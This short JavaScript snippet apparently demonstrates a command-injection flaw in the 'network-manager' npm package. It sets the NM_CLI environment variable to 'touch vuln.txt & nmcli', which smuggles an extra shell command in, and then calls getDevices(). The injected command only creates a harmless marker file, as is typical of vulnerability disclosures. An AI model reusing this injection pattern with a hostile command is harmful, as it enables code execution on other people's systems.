try {
    process.env.NM_CLI = 'touch vuln.txt & nmcli';
    var root = require("network-manager");
    root.getDevices();
} catch (e) {}
